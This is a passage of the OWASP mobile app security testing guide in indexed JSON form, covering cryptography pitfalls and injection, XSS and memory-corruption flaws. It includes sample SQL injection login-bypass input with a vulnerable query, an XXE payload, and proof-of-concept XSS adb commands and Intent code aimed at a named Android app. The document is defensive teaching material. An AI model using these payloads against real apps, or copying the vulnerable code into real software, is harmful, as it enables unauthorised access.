Algorithms and Key Lengths\", 2024, NIST provides recommendations and guidance on aligning with future recommendations and transitioning to stronger cryptographic keys and more robust algorithms.</li> <li>Cryptographic means are not mixed with each other: e.g. you do not sign with a public key, or try to reuse a key pair used for a signature to do encryption.</li> <li>Cryptographic parameters are well defined within reasonable range. This includes, but is not limited to: cryptographic salt, which should be at least the same length as hash function output, reasonable choice of password derivation function and iteration count (e.g. PBKDF2, scrypt or bcrypt), IVs being random and unique, fit-for-purpose block encryption modes (e.g. ECB should not be used, except specific cases), key management being done properly (e.g. 3DES should have three independent keys) and so on.</li> </ul> <p>Recommended algorithms:</p> <ul> <li>Confidentiality algorithms: AES-GCM-256 or ChaCha20-Poly1305</li> <li>Integrity algorithms: SHA-256, SHA-384, SHA-512, BLAKE3, the SHA-3 family</li> <li>Digital signature algorithms: RSA (3072 bits and higher), ECDSA with NIST P-384 or EdDSA with Edwards448.</li> <li>Key establishment algorithms: RSA (3072 bits and higher), DH (3072 bits or higher), ECDH with NIST P-384</li> </ul> <p>Please note: The recommendations are based on the current industry perception of what is considered appropriate. They align with NIST recommendations beyond 2030 but do not necessarily take into account advancements in quantum computing. For advice on post-quantum cryptography, please see the \"Post-Quantum\" section below.</p> <p>Additionally, you should always rely on secure hardware (if available) for storing encryption keys, performing cryptographic operations, etc.</p> <p>For more information on algorithm choice and best practices, see the following resources:</p> <ul> <li>\"Commercial National Security Algorithm Suite and Quantum Computing FAQ\"</li> <li>NIST recommendations (2019)</li> <li>BSI recommendations (2019)</li> <li>NIST SP 800-56B Revision 2 - \"Recommendation for Pair-Wise Key-Establishment Using Integer Factorization Cryptography\", 2019: NIST advises using RSA-based key-transport schemes with a minimum modulus length of at least 2048 bits.</li> <li>NIST SP 800-56A Revision 3 - \"Recommendation for Pair-Wise Key-Establishment Schemes Using Discrete Logarithm Cryptography\", 2018: NIST advises using ECC-based key-agreement schemes, such as Elliptic Curve Diffie-Hellman (ECDH), utilizing curves from P-224 to P-521.</li> <li>FIPS 186-5 - \"Digital Signature Standard (DSS)\", 2023: NIST approves RSA, ECDSA, and EdDSA for digital signature generation. DSA should only be used to verify previously generated signatures.</li> <li>NIST SP 800-186 - \"Recommendations for Discrete Logarithm-Based Cryptography: Elliptic Curve Domain Parameters\", 2023: Provides recommendations for elliptic curve domain parameters used in discrete logarithm-based cryptography.</li> </ul>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#post-quantum","title":"Post-Quantum","text":"","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#public-key-encryption-algorithms","title":"Public-Key Encryption Algorithms","text":"<p>In 2024, NIST approved CRYSTALS-Kyber as a post-quantum key encapsulation mechanism (KEM) for establishing a shared secret over a public channel. This shared secret can then be used with symmetric-key algorithms for encryption and decryption.</p> <ul> <li>FIPS 203 - \"Module-Lattice-Based Key-Encapsulation Mechanism Standard\", 2024: Specifies CRYSTALS-Kyber as the standard for post-quantum key encapsulation.</li> </ul>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#signatures","title":"Signatures","text":"<p>In 2024, NIST approved SLH-DSA and ML-DSA as recommended digital signature algorithms for post-quantum signature generation and verification.</p> <ul> <li>FIPS 205 - \"Stateless Hash-Based Digital Signature Standard\", 2024: Specifies SLH-DSA for post-quantum digital signatures.</li> <li>FIPS 204 - \"Module-Lattice-Based Digital Signature Standard\", 2024: Specifies ML-DSA for post-quantum digital signatures.</li> </ul>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#common-configuration-issues","title":"Common Configuration Issues","text":"","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#insufficient-key-length","title":"Insufficient Key Length","text":"<p>Even the most secure encryption algorithm becomes vulnerable to brute-force attacks when that algorithm uses an insufficient key size.</p> <p>Ensure that the key length fulfills accepted industry standards.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#symmetric-encryption-with-hard-coded-cryptographic-keys","title":"Symmetric Encryption with Hard-Coded Cryptographic Keys","text":"<p>The security of symmetric encryption and keyed hashes (MACs) depends on the secrecy of the key. If the key is disclosed, the security gained by encryption is lost. To prevent this, never store secret keys in the same place as the encrypted data they helped create. A common mistake is encrypting locally stored data with a static, hardcoded encryption key and compiling that key into the app. This makes the key accessible to anyone who can use a disassembler.</p> <p>Hardcoded encryption key means that a key is:</p> <ul> <li>part of application resources</li> <li>value which can be derived from known values</li> <li>hardcoded in code</li> </ul> <p>First, ensure that no keys or passwords are stored within the source code. This means you should check native code, JavaScript/Dart code, Java/Kotlin code on Android and Objective-C/Swift in iOS. Note that hard-coded keys are problematic even if the source code is obfuscated since obfuscation is easily bypassed by dynamic instrumentation.</p> <p>If the app is using two-way TLS (both server and client certificates are validated), make sure that:</p> <ul> <li>The password to the client certificate isn't stored locally or is locked in the device Keychain.</li> <li>The client certificate isn't shared among all installations.</li> </ul> <p>If the app relies on an additional encrypted container stored in app data, check how the encryption key is used. If a key-wrapping scheme is used, ensure that the master secret is initialized for each user or the container is re-encrypted with new key. If you can use the master secret or previous password to decrypt the container, check how password changes are handled.</p> <p>Secret keys must be stored in secure device storage whenever symmetric cryptography is used in mobile apps. For more information on the platform-specific APIs, see the \"Data Storage on Android\" and \"Data Storage on iOS\" chapters.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#improper-key-derivation-functions","title":"Improper Key Derivation Functions","text":"<p>Cryptographic algorithms (such as symmetric encryption or some MACs) expect a secret input of a given size. For example, AES uses a key of exactly 16 bytes. A native implementation might use the user-supplied password directly as an input key. Using a user-supplied password as an input key has the following problems:</p> <ul> <li>If the password is smaller than the key, the full key space isn't used. The remaining space is padded (spaces are sometimes used for padding).</li> <li>A user-supplied password will realistically consist mostly of displayable and pronounceable characters. Therefore, only some of the possible 256 ASCII characters are used and entropy is decreased by approximately a factor of four.</li> </ul> <p>Ensure that passwords aren't directly passed into an encryption function. Instead, the user-supplied password should be passed into a KDF to create a cryptographic key. Choose an appropriate iteration count when using password derivation functions. For example, NIST recommends an iteration count of at least 10,000 for PBKDF2 and for critical keys where user-perceived performance is not critical at least 10,000,000. For critical keys, it is recommended to consider implementation of algorithms recognized by Password Hashing Competition (PHC) like Argon2.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#improper-random-number-generation","title":"Improper Random Number Generation","text":"<p>A common weakness in mobile apps is the improper use of random number generators. Regular Pseudo-Random Number Generators (PRNGs), while sufficient for general use, are not designed for cryptographic purposes. When used to generate keys, tokens, or other security-critical values, they can make systems vulnerable to prediction and attack.</p> <p>The root issue is that deterministic devices cannot produce true randomness. PRNGs simulate randomness using algorithms, but without sufficient entropy and algorithmic strength, the output can be predictable. For example, UUIDs may appear random but do not provide enough entropy for secure use.</p> <p>The correct approach is to use a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG). CSPRNGs are designed to resist statistical analysis and prediction, making them suitable for generating non-guessable values. All security-sensitive values must be generated using a CSPRNG with at least 128 bits of entropy.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#improper-hashing","title":"Improper Hashing","text":"<p>Using the wrong hash function for a given purpose can compromise both security and data integrity. Each hash function is designed with specific use cases in mind, and applying it incorrectly introduces risk.</p> <p>For integrity checks, choose a hash function that offers strong collision resistance. Algorithms such as SHA-256, SHA-384, SHA-512, BLAKE3, and the SHA-3 family are appropriate for verifying data integrity and authenticity. Avoid broken algorithms like MD5 or SHA-1, as they are vulnerable to collision attacks.</p> <p>Do not use general-purpose hash functions like SHA-2 or SHA-3 for password hashing or key derivation, especially with predictable input.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#custom-implementations-of-cryptography","title":"Custom Implementations of Cryptography","text":"<p>Inventing proprietary cryptographic functions is time-consuming, difficult, and likely to fail. Instead, we can use well-known algorithms that are widely regarded as secure. Mobile operating systems offer standard cryptographic APIs that implement those algorithms.</p> <p>Carefully inspect all the cryptographic methods used within the source code, especially those that are directly applied to sensitive data. All cryptographic operations should use standard cryptographic APIs for Android and iOS (we'll write about those in more detail in the platform-specific chapters). Any cryptographic operations that don't invoke standard routines from known providers should be closely inspected. Pay close attention to standard algorithms that have been modified. Remember that encoding isn't the same as encryption! Always investigate further when you find bit manipulation operators like XOR (exclusive OR).</p> <p>In all implementations of cryptography, you need to ensure that the following always takes place:</p> <ul> <li>Working keys (like intermediary/derived keys in AES/DES/Rijndael) are properly removed from memory after consumption or in case of error.</li> <li>The inner state of a cipher should be removed from memory as soon as possible.</li> </ul>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#improper-encryption","title":"Improper Encryption","text":"<p>Advanced Encryption Standard (AES) is the widely accepted standard for symmetric encryption in mobile apps. It's an iterative block cipher that is based on a series of linked mathematical operations. AES performs a variable number of rounds on the input, each of which involve substitution and permutation of the bytes in the input block. Each round uses a 128-bit round key which is derived from the original AES key.</p> <p>As of this writing, no efficient cryptanalytic attacks against AES have been discovered. However, implementation details and configurable parameters such as the block cipher mode leave some margin for error.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#broken-block-cipher-modes","title":"Broken Block Cipher Modes","text":"<p>Block-based encryption is performed upon discrete input blocks (for example, AES has 128-bit blocks). If the plaintext is larger than the block size, the plaintext is internally split up into blocks of the given input size and encryption is performed on each block. A block cipher mode of operation (or block mode) determines if the result of encrypting the previous block impacts subsequent blocks.</p> <p>Avoid using the ECB (Electronic Codebook) mode. ECB divides the input into fixed-size blocks that are encrypted separately using the same key. If multiple divided blocks contain the same plaintext, they will be encrypted into identical ciphertext blocks which makes patterns in data easier to identify. In some situations, an attacker might also be able to replay the encrypted data.</p> <p></p> <p>For new designs, prefer authenticated encryption with associated data (AEAD) modes such as Galois/Counter Mode (GCM) or Counter with CBC-MAC (CCM), as these provide both confidentiality and integrity. If GCM or CCM are not available, Cipher Block Chaining (CBC) mode is better than ECB, but should be combined with an HMAC and/or ensure that no errors are given such as \"Padding error\", \"MAC error\", or \"decryption failed\" to be more resistant to padding oracle attacks. In CBC mode, plaintext blocks are XORed with the previous ciphertext block, ensuring that each encrypted block is unique and randomized even if blocks contain the same information.</p> <p>When storing encrypted data, we recommend using a block mode that also protects the integrity of the stored data, such as Galois/Counter Mode (GCM). The latter has the additional benefit that the algorithm is mandatory for each TLSv1.2 implementation, and thus is available on all modern platforms. To protect the integrity and authenticity of the data using CBC mode, it is recommended to combine the techniques of the Counter (CTR) mode and the Cipher Block Chaining-Message Authentication Code (CBC-MAC) into what is called CCM Mode (NIST, 2004).</p> <p>For more information on effective block modes, see the NIST guidelines on block mode selection.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#predictable-initialization-vector","title":"Predictable Initialization Vector","text":"<p>CBC, OFB, CFB, PCBC, GCM mode require an initialization vector (IV) as an initial input to the cipher. The IV doesn't have to be kept secret, but it shouldn't be predictable: it should be random and unique/non-repeatable for each encrypted message. Make sure that IVs are generated using a cryptographically secure random number generator. For more information on IVs, see Crypto Fail's initialization vectors article.</p> <p>Pay attention to cryptographic libraries used in the code: many open source libraries provide examples in their documentations that might follow bad practices (e.g. using a hardcoded IV). A popular mistake is copy-pasting example code without changing the IV value.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#using-the-same-key-for-encryption-and-authentication","title":"Using the Same Key for Encryption and Authentication","text":"<p>One common mistake is to reuse the same key for CBC encryption and CBC-MAC. Reuse of keys for different purposes is generally not recommended, but in the case of CBC-MAC the mistake can lead to a MitM attack (\"CBC-MAC\", 2024.10.11).</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#initialization-vectors-in-stateful-operation-modes","title":"Initialization Vectors in Stateful Operation Modes","text":"<p>Please note that the usage of IVs is different when using CTR and GCM mode in which the initialization vector is often a counter (in CTR combined with a nonce). So here using a predictable IV with its own stateful model is exactly what is needed. In CTR you have a new nonce plus counter as an input to every new block operation. For example: for a 5120 bit long plaintext: you have 20 blocks, so you need 20 input vectors consisting of a nonce and counter. Whereas in GCM you have a single IV per cryptographic operation, which should not be repeated with the same key. See section 8 of the documentation from NIST on GCM for more details and recommendations of the IV.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#padding-oracle-attacks-due-to-weaker-padding-or-block-operation-implementations","title":"Padding Oracle Attacks due to Weaker Padding or Block Operation Implementations","text":"<p>In the old days, PKCS1.5 padding (in code: <code>PKCS1Padding</code>) was used as a padding mechanism when doing asymmetric encryption. This mechanism is vulnerable to the padding oracle attack. Therefore, it is best to use OAEP (Optimal Asymmetric Encryption Padding) captured in PKCS#1 v2.0 (in code: <code>OAEPPadding</code>, <code>OAEPwithSHA-256andMGF1Padding</code>, <code>OAEPwithSHA-224andMGF1Padding</code>, <code>OAEPwithSHA-384andMGF1Padding</code>, <code>OAEPwithSHA-512andMGF1Padding</code>). Note that, even when using OAEP, you can still run into an issue known best as the Manger's attack as described in the blog at Kudelskisecurity.</p> <p>Note: AES-CBC with PKCS #7 has shown to be vulnerable to padding oracle attacks as well, given that the implementation gives warnings, such as \"Padding error\", \"MAC error\", or \"decryption failed\". See The Padding Oracle Attack and The CBC Padding Oracle Problem for an example. Next, it is best to ensure that you add an HMAC after you encrypt the plaintext: after all a ciphertext with a failing MAC will not have to be decrypted and can be discarded.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#protecting-keys-in-storage-and-in-memory","title":"Protecting Keys in Storage and in Memory","text":"<p>When memory dumping is part of your threat model, then keys can be accessed the moment they are actively used. Memory dumping either requires root-access (e.g. a rooted device or jailbroken device) or it requires a patched application with Frida (so you can use tools like  Fridump). Therefore it is best to consider the following, if keys are still needed at the device:</p> <ul> <li>Keys in a Remote Server: you can use remote Key vaults such as Amazon KMS or Azure Key Vault. For some use cases, developing an orchestration layer between the app and the remote resource might be a suitable option. For instance, a serverless function running on a Function as a Service (FaaS) system (e.g. AWS Lambda or Google Cloud Functions) which forwards requests to retrieve an API key or secret. There are other alternatives such as Amazon Cognito, Google Identity Platform or Azure Active Directory.</li> <li>Keys inside Secure Hardware-backed Storage: make sure that all cryptographic actions and the key itself remain in the Trusted Execution Environment (e.g. use Android Keystore) or Secure Enclave (e.g. use the Keychain). Refer to the Android Data Storage and iOS Data Storage chapters for more information.</li> <li>Keys protected by Envelope Encryption: If keys are stored outside of the TEE / SE, consider using multi-layered encryption: an envelope encryption approach (see OWASP Cryptographic Storage Cheat Sheet, Google Cloud Key management guide, AWS Well-Architected Framework guide), or a HPKE approach to encrypt data encryption keys with key encryption keys.</li> <li>Keys in Memory: make sure that keys live in memory for the shortest time possible and consider zeroing out and nullifying keys after successful cryptographic operations, and in case of error. Note: In some languages and platforms (such as those with garbage collection or memory management optimizations), reliably zeroing memory may not be possible, as the runtime may move or copy memory or delay actual erasure. For general cryptocoding guidelines, refer to Clean memory of secret data.</li> </ul> <p>Note: given the ease of memory dumping, never share the same key among accounts and/or devices, other than public keys used for signature verification or encryption.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#protecting-keys-in-transport","title":"Protecting Keys in Transport","text":"<p>When keys need to be transported from one device to another, or from the app to a backend, make sure that proper key protection is in place, by means of a transport keypair or another mechanism. Often, keys are shared with obfuscation methods which can be easily reversed. Instead, make sure asymmetric cryptography or wrapping keys are used. For example, a symmetric key can be encrypted with the public key from an asymmetric key pair.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#cryptographic-apis-on-android-and-ios","title":"Cryptographic APIs on Android and iOS","text":"<p>While same basic cryptographic principles apply independent of the particular OS, each operating system offers its own implementation and APIs. Platform-specific cryptographic APIs for data storage are covered in greater detail in the \"Data Storage on Android\" and \"Testing Data Storage on iOS\" chapters. Encryption of network traffic, especially Transport Layer Security (TLS), is covered in the \"Android Network APIs\" chapter.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#cryptographic-policy","title":"Cryptographic Policy","text":"<p>In larger organizations, or when high-risk applications are created, it can often be a good practice to have a cryptographic policy, based on frameworks such as NIST Recommendation for Key Management. When basic errors are found in the application of cryptography, it can be a good starting point of setting up a lessons learned / cryptographic key management policy.</p>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04g-Testing-Cryptography/#cryptography-regulations","title":"Cryptography Regulations","text":"<p>When you upload the app to the App Store or Google Play, your application is typically stored on a US server. If your app contains cryptography and is distributed to any other country, it is considered a cryptography export. It means that you need to follow US export regulations for cryptography. Also, some countries have import regulations for cryptography.</p> <p>Learn more:</p> <ul> <li>Complying with Encryption Export Regulations (Apple)</li> <li>Export compliance overview (Apple)</li> <li>Export compliance (Google)</li> <li>Encryption and Export Administration Regulations (USA)</li> <li>World map of encryption laws and policies</li> </ul>","tags":["all","MASVS-CRYPTO"]},{"location":"MASTG/0x04h-Testing-Code-Quality/","title":"Mobile App Code Quality","text":"<p>Mobile app developers use a wide variety of programming languages and frameworks. As such, common vulnerabilities such as SQL injection, buffer overflows, and cross-site scripting (XSS), may manifest in apps when neglecting secure programming practices.</p> <p>The same programming flaws may affect both Android and iOS apps to some degree, so we'll provide an overview of the most common vulnerability classes frequently in the general section of the guide. In later sections, we will cover OS-specific instances and exploit mitigation features.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#injection-flaws","title":"Injection Flaws","text":"<p>An injection flaw describes a class of security vulnerability occurring when user input is inserted into backend queries or commands. By injecting meta-characters, an attacker can execute malicious code that is inadvertently interpreted as part of the command or query. For example, by manipulating a SQL query, an attacker could retrieve arbitrary database records or manipulate the content of the backend database.</p> <p>Vulnerabilities of this class are most prevalent in server-side web services. Exploitable instances also exist within mobile apps, but occurrences are less common, plus the attack surface is smaller.</p> <p>For example, while an app might query a local SQLite database, such databases usually do not store sensitive data (assuming the developer followed basic security practices). This makes SQL injection a non-viable attack vector. Nevertheless, exploitable injection vulnerabilities sometimes occur, meaning proper input validation is a necessary best practice for programmers.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#sql-injection","title":"SQL Injection","text":"<p>A SQL injection attack involves integrating SQL commands into input data, mimicking the syntax of a predefined SQL command. A successful SQL injection attack allows the attacker to read or write to the database and possibly execute administrative commands, depending on the permissions granted by the server.</p> <p>Apps on both Android and iOS use SQLite databases as a means to control and organize local data storage. Assume an Android app handles local user authentication by storing the user credentials in a local database (a poor programming practice we'll overlook for the sake of this example). Upon login, the app queries the database to search for a record with the username and password entered by the user:</p> <pre><code>SQLiteDatabase db;\n\nString sql = \"SELECT * FROM users WHERE username = '\" +  username + \"' AND password = '\" + password +\"'\";\n\nCursor c = db.rawQuery( sql, null );\n\nreturn c.getCount() != 0;\n</code></pre> <p>Let's further assume an attacker enters the following values into the \"username\" and \"password\" fields:</p> <pre><code>username = 1' or '1' = '1\npassword = 1' or '1' = '1\n</code></pre> <p>This results in the following query:</p> <pre><code>SELECT * FROM users WHERE username='1' OR '1' = '1' AND Password='1' OR '1' = '1'\n</code></pre> <p>Because the condition <code>'1' = '1'</code> always evaluates as true, this query return all records in the database, causing the login function to return <code>true</code> even though no valid user account was entered.</p> <p>Ostorlab exploited the sort parameter of Yahoo's weather mobile application with adb using this SQL injection payload.</p> <p>Another real-world instance of client-side SQL injection was discovered by Mark Woods within the \"Qnotes\" and \"Qget\" Android apps running on QNAP NAS storage appliances. These apps exported content providers vulnerable to SQL injection, allowing an attacker to retrieve the credentials for the NAS device. A detailed description of this issue can be found on the Nettitude Blog.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#xml-injection","title":"XML Injection","text":"<p>In a XML injection attack, the attacker injects XML meta-characters to structurally alter XML content. This can be used to either compromise the logic of an XML-based application or service, as well as possibly allow an attacker to exploit the operation of the XML parser processing the content.</p> <p>A popular variant of this attack is XML eXternal Entity (XXE). Here, an attacker injects an external entity definition containing an URI into the input XML. During parsing, the XML parser expands the attacker-defined entity by accessing the resource specified by the URI. The integrity of the parsing application ultimately determines capabilities afforded to the attacker, where the malicious user could do any (or all) of the following: access local files, trigger HTTP requests to arbitrary hosts and ports, launch a cross-site request forgery (CSRF) attack, and cause a denial-of-service condition. The OWASP web testing guide contains the following example for XXE:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n &lt;!DOCTYPE foo [\n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///dev/random\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <p>In this example, the local file <code>/dev/random</code> is opened where an endless stream of bytes is returned, potentially causing a denial-of-service.</p> <p>The current trend in app development focuses mostly on REST/JSON-based services as XML is becoming less common. However, in the rare cases where user-supplied or otherwise untrusted content is used to construct XML queries, it could be interpreted by local XML parsers, such as NSXMLParser on iOS. As such, said input should always be validated and meta-characters should be escaped.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#injection-attack-vectors","title":"Injection Attack Vectors","text":"<p>The attack surface of mobile apps is quite different from typical web and network applications. Mobile apps don't often expose services on the network, and viable attack vectors on an app's user interface are rare. Injection attacks against an app are most likely to occur through inter-process communication (IPC) interfaces, where a malicious app attacks another app running on the device.</p> <p>Locating a potential vulnerability begins by either:</p> <ul> <li>Identifying possible entry points for untrusted input then tracing from those locations to see if the destination contains potentially vulnerable functions.</li> <li>Identifying known, dangerous library / API calls (e.g. SQL queries) and then checking whether unchecked input successfully interfaces with respective queries.</li> </ul> <p>During a manual security review, you should employ a combination of both techniques. In general, untrusted inputs enter mobile apps through the following channels:</p> <ul> <li>IPC calls</li> <li>Custom URL schemes</li> <li>QR codes</li> <li>Input files received via Bluetooth, NFC, or other means</li> <li>Pasteboards</li> <li>User interface</li> </ul> <p>Verify that the following best practices have been followed:</p> <ul> <li>Untrusted inputs are type-checked and/or validated using a list of acceptable values.</li> <li>Prepared statements with variable binding (i.e. parameterized queries) are used when performing database queries. If prepared statements are defined, user-supplied data and SQL code are automatically separated.</li> <li>When parsing XML data, ensure the parser application is configured to reject resolution of external entities in order to prevent XXE attack.</li> <li>When working with x509 formatted certificate data, ensure that secure parsers are used. For instance Bouncy Castle below version 1.6 allows for Remote Code Execution by means of unsafe reflection.</li> </ul> <p>We will cover details related to input sources and potentially vulnerable APIs for each mobile OS in the OS-specific testing guides.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#cross-site-scripting-flaws","title":"Cross-Site Scripting Flaws","text":"<p>Cross-site scripting (XSS) issues allow attackers to inject client-side scripts into web pages viewed by users. This type of vulnerability is prevalent in web applications. When a user views the injected script in a browser, the attacker gains the ability to bypass the same origin policy, enabling a wide variety of exploits (e.g. stealing session cookies, logging key presses, performing arbitrary actions, etc.).</p> <p>In the context of native apps, XSS risks are far less prevalent for the simple reason these kinds of applications do not rely on a web browser. However, apps using WebView components, such as <code>WKWebView</code> or the deprecated <code>UIWebView</code> on iOS and <code>WebView</code> on Android, are potentially vulnerable to such attacks.</p> <p>An older but well-known example is the local XSS issue in the Skype app for iOS, first identified by Phil Purviance. The Skype app failed to properly encode the name of the message sender, allowing an attacker to inject malicious JavaScript to be executed when a user views the message. In this proof-of-concept, Phil showed how to exploit the issue and steal a user's address book.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#static-analysis-security-testing-considerations","title":"Static Analysis - Security Testing Considerations","text":"<p>Take a close look at any WebViews present and investigate for untrusted input rendered by the app.</p> <p>XSS issues may exist if the URL opened by WebView is partially determined by user input. The following example is from an XSS issue in the Zoho Web Service, reported by Linus S\u00e4rud.</p> <p>Java</p> <pre><code>webView.loadUrl(\"javascript:initialize(\" + myNumber + \");\");\n</code></pre> <p>Kotlin</p> <pre><code>webView.loadUrl(\"javascript:initialize($myNumber);\")\n</code></pre> <p>Another example of XSS issues determined by user input is public overridden methods.</p> <p>Java</p> <pre><code>@Override\npublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n  if (url.substring(0,6).equalsIgnoreCase(\"yourscheme:\")) {\n    // parse the URL object and execute functions\n  }\n}\n</code></pre> <p>Kotlin</p> <pre><code>    fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {\n        if (url.substring(0, 6).equals(\"yourscheme:\", ignoreCase = true)) {\n            // parse the URL object and execute functions\n        }\n    }\n</code></pre> <p>Sergey Bobrov was able to take advantage of this in the following HackerOne report. Any input to the HTML parameter would be trusted in Quora's ActionBarContentActivity. Payloads were successful using adb, clipboard data via ModalContentActivity, and Intents from third-party applications.</p> <ul> <li>ADB</li> </ul> <pre><code>$ adb shell\n$ am start -n com.quora.android/com.quora.android.ActionBarContentActivity \\\n-e url 'http://test/test' -e html 'XSS&lt;script&gt;alert(123)&lt;/script&gt;'\n</code></pre> <ul> <li>Clipboard Data</li> </ul> <pre><code>$ am start -n com.quora.android/com.quora.android.ModalContentActivity  \\\n-e url 'http://test/test' -e html \\\n'&lt;script&gt;alert(QuoraAndroid.getClipboardData());&lt;/script&gt;'\n</code></pre> <ul> <li>third-party Intent in Java or Kotlin:</li> </ul> <pre><code>Intent i = new Intent();\ni.setComponent(new ComponentName(\"com.quora.android\",\n\"com.quora.android.ActionBarContentActivity\"));\ni.putExtra(\"url\",\"http://test/test\");\ni.putExtra(\"html\",\"XSS PoC &lt;script&gt;alert(123)&lt;/script&gt;\");\nview.getContext().startActivity(i);\n</code></pre> <pre><code>val i = Intent()\ni.component = ComponentName(\"com.quora.android\",\n\"com.quora.android.ActionBarContentActivity\")\ni.putExtra(\"url\", \"http://test/test\")\ni.putExtra(\"html\", \"XSS PoC &lt;script&gt;alert(123)&lt;/script&gt;\")\nview.context.startActivity(i)\n</code></pre> <p>If a WebView is used to display a remote website, the burden of escaping HTML shifts to the server side. If an XSS flaw exists on the web server, this can be used to execute script in the context of the WebView. As such, it is important to perform static analysis of the web application source code.</p> <p>Verify that the following best practices have been followed:</p> <ul> <li>No untrusted data is rendered in HTML, JavaScript or other interpreted contexts unless it is absolutely necessary.</li> <li>Appropriate encoding is applied to escape characters, such as HTML entity encoding. Note: escaping rules become complicated when HTML is nested within other code, for example, rendering a URL located inside a JavaScript block.</li> </ul> <p>Consider how data will be rendered in a response. For example, if data is rendered in a HTML context, six control characters that must be escaped:</p> Character Escaped &amp; &amp;amp; &lt; &amp;lt; &gt; &amp;gt; \" &amp;quot; ' &amp;#x27; / &amp;#x2F; <p>For a comprehensive list of escaping rules and other prevention measures, refer to the OWASP XSS Prevention Cheat Sheet.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#dynamic-analysis-security-testing-considerations","title":"Dynamic Analysis - Security Testing Considerations","text":"<p>XSS issues can be best detected using manual and/or automated input fuzzing, i.e. injecting HTML tags and special characters into all available input fields to verify the web application denies invalid inputs or escapes the HTML meta-characters in its output.</p> <p>A reflected XSS attack refers to an exploit where malicious code is injected via a malicious link. To test for these attacks, automated input fuzzing is considered to be an effective method. For example, the BURP Scanner is highly effective in identifying reflected XSS vulnerabilities. As always with automated analysis, ensure all input vectors are covered with a manual review of testing parameters.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#memory-corruption-bugs","title":"Memory Corruption Bugs","text":"<p>Memory corruption bugs are a popular mainstay with hackers. This class of bug results from a programming error that causes the program to access an unintended memory location. Under the right conditions, attackers can capitalize on this behavior to hijack the execution flow of the vulnerable program and execute arbitrary code. This kind of vulnerability occurs in a number of ways:</p> <ul> <li> <p>Buffer overflows: This describes a programming error where an app writes beyond an allocated memory range for a particular operation. An attacker can use this flaw to overwrite important control data located in adjacent memory, such as function pointers. Buffer overflows were formerly the most common type of memory corruption flaw, but have become less prevalent over the years due to a number of factors. Notably, awareness among developers of the risks in using unsafe C library functions is now a common best practice plus, catching buffer overflow bugs is relatively simple. However, it is still worth testing for such defects.</p> </li> <li> <p>Out-of-bounds-access: Buggy pointer arithmetic may cause a pointer or index to reference a position beyond the bounds of the intended memory structure (e.g. buffer or list). When an app attempts to write to an out-of-bounds address, a crash or unintended behavior occurs. If the attacker can control the target offset and manipulate the content written to some extent, code execution exploit is likely possible.</p> </li> <li> <p>Dangling pointers: These occur when an object with an incoming reference to a memory location is deleted or deallocated, but the object pointer is not reset. If the program later uses the dangling pointer to call a virtual function of the already deallocated object, it is possible to hijack execution by overwriting the original vtable pointer. Alternatively, it is possible to read or write object variables or other memory structures referenced by a dangling pointer.</p> </li> <li> <p>Use-after-free: This refers to a special case of dangling pointers referencing released (deallocated) memory. After a memory address is cleared, all pointers referencing the location become invalid, causing the memory manager to return the address to a pool of available memory. When this memory location is eventually re-allocated, accessing the original pointer will read or write the data contained in the newly allocated memory. This usually leads to data corruption and undefined behavior, but crafty attackers can set up the appropriate memory locations to leverage control of the instruction pointer.</p> </li> <li> <p>Integer overflows: When the result of an arithmetic operation exceeds the maximum value for the integer type defined by the programmer, this results in the value \"wrapping around\" the maximum integer value, inevitably resulting in a small value being stored. Conversely, when the result of an arithmetic operation is smaller than the minimum value of the integer type, an integer underflow occurs where the result is larger than expected. Whether a particular integer overflow/underflow bug is exploitable depends on how the integer is used. 